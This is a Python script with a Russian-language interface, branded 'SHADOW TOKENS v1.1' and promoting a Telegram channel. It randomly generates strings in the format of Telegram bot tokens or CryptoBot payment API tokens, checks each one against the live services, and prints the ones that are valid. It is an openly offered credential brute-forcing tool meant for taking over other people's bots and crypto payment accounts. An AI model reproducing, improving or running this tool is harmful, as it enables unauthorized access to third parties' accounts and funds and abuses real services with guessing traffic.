import random
import string
import asyncio
from aiogram import Bot
from aiogram.utils.exceptions import TelegramAPIError
from aiocryptopay import AioCryptoPay, Networks

def generate_or_fetch_token(check_type):
    if check_type == '1':
        part1 = ''.join(random.choices(string.digits, k=10))
    elif check_type == '2':
        part1 = ''.join(random.choices(string.digits, k=6))
    part2 = 'AA' + random.choice(string.ascii_uppercase) + ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    token = f"{part1}:{part2}"
    return token

async def check_token_validity_with_aiocryptopay(token):
    crypto = AioCryptoPay(token=token, network=Networks.MAIN_NET)
    try:
        profile = await crypto.get_me()
        return True
    except Exception as e:
        return False
    finally:
        await crypto._session.close()

async def check_token_validity_telegram(token):
    bot = Bot(token=token)
    try:
        await bot.get_me()
        return True
    except TelegramAPIError:
        return False
    finally:
        session = await bot.get_session()
        await session.close()

async def main():
    print("\n=== 🔐 SHADOW TOKENS v1.1 ===")
    print("Разработчик: @resilentss")
    print("Канал: https://t.me/shadowbizz")
    print("==================================")
    print("Узнать всю информацию о валидном токене: t.me/shadowtool_bot\n")
    print("==================================")

    try:
        num_tokens = int(input("Введите количество токенов для проверки: "))
    except ValueError:
        print("❌ Пожалуйста, введите корректное число.")
        return

    check_type = input("Выберите тип проверки (1 - Telegram, 2 - CryptoBot): ")
    if check_type not in ['1', '2']:
        print("❌ Пожалуйста, выберите правильный вариант (1 или 2).")
        return

    print("\n🔍 Начало процесса генерации и проверки токенов.\n")

    valid_tokens_count = 0
    valid_tokens = []

    for _ in range(num_tokens):
        token = generate_or_fetch_token(check_type)

        if check_type == '1':
            is_valid = await check_token_validity_telegram(token)
            if is_valid:
                valid_tokens_count += 1
                valid_tokens.append(token)
                print(f"✅ Токен {token} валиден для Telegram.")
            else:
                print(f"❌ Токен {token} не валиден для Telegram.")
        elif check_type == '2':
            is_valid = await check_token_validity_with_aiocryptopay(token)
            if is_valid:
                valid_tokens_count += 1
                valid_tokens.append(token)
                print(f"✅ Токен {token} валиден для CryptoBot.")
            else:
                print(f"❌ Токен {token} не валиден для CryptoBot.")

    print("\n📊 Статистика проверки токенов:")
    print(f"- Всего токенов проверено: {num_tokens}")
    print(f"- Валидных токенов: {valid_tokens_count}")
    print(f"- Невалидных токенов: {num_tokens - valid_tokens_count}")

    if valid_tokens:
        print("\n📜 Список валидных токенов:")
        for token in valid_tokens:
            print(f"🔑 {token}")

if __name__ == "__main__":
    asyncio.run(main())